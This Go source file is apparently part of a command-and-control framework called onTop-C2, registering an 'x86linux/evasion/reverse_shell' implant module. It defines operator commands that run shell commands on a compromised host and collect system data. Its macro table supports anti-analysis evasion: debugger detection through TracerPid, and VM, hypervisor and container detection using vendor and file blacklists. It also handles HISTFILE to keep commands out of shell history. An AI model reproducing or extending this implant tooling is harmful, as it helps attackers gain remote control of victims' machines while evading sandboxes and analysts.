package spells

import (
	"encoding/binary"
	"path"
	"path/filepath"
	"runtime"

	"github.com/Yyax13/onTop-C2/src/types"
)

func x86linux_evasion_reverse_shellInsertCommand(ImplantSideCommand string, originalData []byte) ([]byte, error) {
	dataLen := uint64(len(ImplantSideCommand))
	dataLenBuf := make([]byte, 8);
	binary.BigEndian.PutUint64(dataLenBuf, dataLen)
	
	var resultBytes []byte = append(dataLenBuf, []byte(ImplantSideCommand)...)
	resultBytes = append(resultBytes, originalData...)

	return resultBytes, nil

}

func init() {
	_, filename, _, _ := runtime.Caller(0)
	dirname := filepath.Dir(filename)
	
	var x86linux_evasion_reverse_shellMethods map[string]*types.SpellMethod = map[string]*types.SpellMethod{
		"exec": {
			Name: "Execute",
			Description: "Execute shell commands in INFERI",
			UsageExample: "exec <command>",
			OperatorSideCommand: "exec",
			ImplantSideCommand: "e_i_sh_cmd",
		
		},
		"gbdata": {
			Name: "Get Bot Data",
			Description: "Get the INFERI's Scroll",
			UsageExample: "gbdata",
			OperatorSideCommand: "gbdata",
			ImplantSideCommand: "g_i_dt",

		},
	
	}

	var x86linux_evasion_reverse_shellMacros map[string]*types.SpellMacro = map[string]*types.SpellMacro{
		"BEACON_COMMANDS_EXEC": {
			Macro: "BEACON_COMMANDS_EXEC",
			Value: "e_i_sh_cmd",

		},
		"BEACON_COMMANDS_GET_BOT_DATA": {
			Macro: "BEACON_COMMANDS_GET_BOT_DATA",
			Value: "g_i_dt",

		},
		"ENV_HISTFILE": {
			Macro: "ENV_HISTFILE",
			Value: "HISTFILE",

		},
		"RETRY_METHOD_NONE": {
			Macro: "RETRY_METHOD_NONE",
			Value: "none",

		},
		"RETRY_METHOD_FIXED": {
			Macro: "RETRY_METHOD_FIXED",
			Value: "fixed",

		},
		"RETRY_METHOD_LINEAR": {
			Macro: "RETRY_METHOD_LINEAR",
			Value: "linear",

		},
		"RETRY_METHOD_EXPONENTIAL": {
			Macro: "RETRY_METHOD_EXPONENTIAL",
			Value: "exponential",

		},
		"RETRY_METHOD_EXPONENTIAL_JITTER": {
			Macro: "RETRY_METHOD_EXPONENTIAL_JITTER",
			Value: "exponential_jitter",

		},
		"REQUEST_FROM_C2_FAILED": {
			Macro: "REQUEST_FROM_C2_FAILED",
			Value: "Some error occurred and your request was not executed, sorry.",

		},
		"BIN_SH_PATH": {
			Macro: "BIN_SH_PATH",
			Value: "/bin/sh",

		},
		"PROC_CPUINFO_PATH": {
			Macro: "PROC_CPUINFO_PATH",
			Value: "/proc/cpuinfo",

		},
		"HOSTNAME_PATH": {
			Macro: "HOSTNAME_PATH",
			Value: "/etc/hostname",

		},
		"OS_RELEASE_PATH": {
			Macro: "OS_RELEASE_PATH",
			Value: "/etc/os-release",

		},
		"UPTIME_PATH": {
			Macro: "UPTIME_PATH",
			Value: "/proc/uptime",
			
		},
		"PROC_SELF_STATUS": {
			Macro: "PROC_SELF_STATUS",
			Value: "/proc/self/status",
		
		},
		"TRACERPID_VAL": {
			Macro: "TRACERPID_VAL",
			Value: "TracerPid:",

		},
		"SYS_CLASS_DMI_ID": {
			Macro: "SYS_CLASS_DMI_ID",
			Value: "/sys/class/dmi/id",
		
		},
		"SCDI_SYS_VENDOR": {
			Macro: "SCDI_SYS_VENDOR",
			Value: "sys_vendor",
		
		},
		"SCDI_BIOS_VENDOR": {
			Macro: "SCDI_BIOS_VENDOR",
			Value: "bios_vendor",

		},
		"SCDI_CHASSIS_VENDOR": {
			Macro: "SCDI_CHASSIS_VENDOR",
			Value: "chassis_vendor",

		},
		"HYPERVISOR_VAL": {
			Macro: "HYPERVISOR_VAL",
			Value: "hypervisor",

		},
		"VMS_BLACKLIST_UNSPLIT": {
			Macro: "VMS_BLACKLIST_UNSPLIT",
			Value: "VMware, Inc.||-|=|-||Phoenix Technologies/Intel Corp.||-|=|-||VMware Virtual Platform||-|=|-||innotek GmbH||-|=|-||VirtualBox||-|=|-||Oracle Corporation||-|=|-||QEMU||-|=|-||SeaBIOS||-|=|-||Microsoft Corporation||-|=|-||Xen||-|=|-||Parallels Software International Inc.||-|=|-||Parallels||-|=|-||BHYVE||-|=|-||Virtual||-|=|-||virtual||-|=|-||VM||-|=|-||vm||-|=|-||Bochs||-|=|-||bochs||-|=|-||Hyper-V||-|=|-||hyper-v||-|=|-||KVM||-|=|-||kvm||-|=|-||Xen||-|=|-||xen||-|=|-||QEMU||-|=|-||qemu",
		},
		"VMS_FILES_BLACKLIST_UNSPLIT": {
			Macro: "VMS_FILES_BLACKLIST_UNSPLIT",
			Value: "/proc/vz/veinfo||-|=|-||/proc/bc/info||-|=|-||/sys/hypervisor/type||-|=|-||/proc/xen/capabilities||-|=|-||/.dockerenv||-|=|-||/run/.containerenv",

		},
		"CONTAINER_BLACKLIST_CGROUP": {
			Macro: "CONTAINER_BLACKLIST_CGROUP",
			Value: "docker||-|=|-||lxc||-|=|-||kuberpods||-|=|-||podman||-|=|-||container||-|=|-||machine.slice",

		},
		"VMS_BLACKLIST_SEP": {
			Macro: "VMS_BLACKLIST_SEP",
			Value: "||-|=|-||",

		},
		"PROC_PATH": {
			Macro: "PROC_PATH",
			Value: "/proc",

		},
		"PROC_SELF_CGROUP": {
			Macro: "PROC_SELF_CGROUP",
			Value: "/proc/self/cgroups",

		},

	}

	_payloadDirPath := path.Join(dirname, "x86linux", "evasion", "reverse_shell")
	var x86linux_evasion_reverse_shell types.Spell = types.Spell{
		Name: "x86linux/evasion/reverse_shell",
		Description: "A reverse shell with evasion",
		PayloadAsoluteDirPath: _payloadDirPath,
		Methods: x86linux_evasion_reverse_shellMethods,
		InsertCommand: x86linux_evasion_reverse_shellInsertCommand,
		Macros: x86linux_evasion_reverse_shellMacros,
		OutFileExt: "",
		GccLArgs: []string{"-lm", "-lwrapper", "-lpthread"},

	}

	RegisterNewSpell(&x86linux_evasion_reverse_shell)

}
